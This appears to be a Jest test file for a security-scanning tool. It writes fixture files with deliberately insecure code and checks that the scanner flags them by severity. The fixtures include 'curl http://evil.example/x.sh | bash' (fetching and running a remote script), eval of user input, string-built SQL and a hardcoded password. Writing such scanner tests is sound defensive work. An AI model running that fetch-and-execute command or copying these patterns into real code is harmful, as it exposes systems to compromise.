/**
 * securityScan.test.js — unit tests for security_scan tool.
 *
 * Tests run against temp-dir fixture files that intentionally contain insecure
 * patterns, asserting the regex engine flags them with the right severity and
 * skips excluded dirs and binary files. semgrep is NOT invoked (default off).
 */
'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');

const securityScan = require('../../src/tools/securityScan');

describe('security_scan tool', () => {
  let tmpDir;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secscan-'));
  });

  afterEach(() => {
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch { /* best-effort */ }
  });

  function writeFile(rel, content) {
    const full = path.join(tmpDir, rel);
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, content);
    return full;
  }

  test('flags hardcoded private key as critical', async () => {
    writeFile('src/keys.js', [
      'const key = `-----BEGIN RSA PRIVATE KEY-----',
      'MIIE...fakekeymaterial...',
      '-----END RSA PRIVATE KEY-----`;',
    ].join('\n'));

    const res = await securityScan.execute({ cwd: tmpDir });
    expect(res.success).toBe(true);
    expect(res.meta.totalFindings).toBeGreaterThan(0);
    expect(res.meta.bySeverity.critical).toBeGreaterThanOrEqual(1);
    expect(res.content).toContain('keys.js');
  });

  test('flags shell pipe exec as critical and eval as medium', async () => {
    writeFile('install.sh', 'curl http://evil.example/x.sh | bash\n');
    writeFile('run.js', 'eval(userInput);\n');

    const res = await securityScan.execute({ cwd: tmpDir });
    expect(res.success).toBe(true);
    expect(res.meta.totalFindings).toBeGreaterThanOrEqual(2);
    const sevs = Object.keys(res.meta.bySeverity);
    expect(sevs).toContain('critical');
  });

  test('flags weak crypto (md5)', async () => {
    writeFile('hash.js', "const h = crypto.createHash('md5').update(x).digest('hex');\n");

    const res = await securityScan.execute({ cwd: tmpDir, minSeverity: 'low' });
    expect(res.success).toBe(true);
    const found = res.content.toLowerCase();
    expect(found).toContain('md5');
  });

  test('minSeverity filters out low findings', async () => {
    writeFile('hash.js', "const h = crypto.createHash('md5').digest('hex');\n"); // low only

    const res = await securityScan.execute({ cwd: tmpDir, minSeverity: 'high' });
    expect(res.success).toBe(true);
    // md5 is low severity → filtered out at minSeverity:high
    expect(res.content.toLowerCase()).not.toContain('md5 (cryptographically');
  });

  test('skips node_modules and excluded dirs', async () => {
    writeFile('node_modules/evil/index.js', 'eval(x); curl http://x | bash\n');
    writeFile('src/clean.js', 'const a = 1;\n');

    const res = await securityScan.execute({ cwd: tmpDir });
    expect(res.success).toBe(true);
    // node_modules content must not be scanned
    expect(res.content).not.toContain('node_modules');
  });

  test('clean project reports no issues', async () => {
    writeFile('src/clean.js', 'function add(a, b) { return a + b; }\nmodule.exports = { add };\n');

    const res = await securityScan.execute({ cwd: tmpDir });
    expect(res.success).toBe(true);
    expect(res.meta.totalFindings).toBe(0);
    expect(res.content).toContain('no issues');
  });

  test('reports findings with file:line and severity grouping in meta', async () => {
    writeFile('app.js', [
      'const a = 1;',
      'const sql = query("SELECT * FROM users WHERE id=" + id);',
      'const p = "password" + "=" + "abc12345";',
    ].join('\n'));

    const res = await securityScan.execute({ cwd: tmpDir, minSeverity: 'low' });
    expect(res.success).toBe(true);
    expect(res.meta.totalFindings).toBeGreaterThan(0);
    expect(typeof res.meta.bySeverity).toBe('object');
    expect(res.meta.scannerEngine).toBe('regex');
    expect(res.meta.semgrepAvailable).toBe(false);
    // Content references a file:line
    expect(res.content).toMatch(/app\.js:\d+/);
  });

  test('rejects non-directory cwd', async () => {
    const filePath = writeFile('notadir.js', 'x');
    const res = await securityScan.execute({ cwd: filePath });
    expect(res.success).toBe(false);
    expect(res.content).toContain('not a directory');
  });

  test('schema validates and exposes read-only metadata', () => {
    expect(securityScan.name).toBe('security_scan');
    expect(securityScan.category).toBe('analysis');
    expect(securityScan.isReadOnly()).toBe(true);
    expect(securityScan.isConcurrencySafe()).toBe(true);

    const ok = securityScan.validate({ cwd: '/tmp', minSeverity: 'high', maxFiles: 100 });
    expect(ok.valid).toBe(true);

    const badSeverity = securityScan.validate({ minSeverity: 'bogus' });
    expect(badSeverity.valid).toBe(false);
  });
});
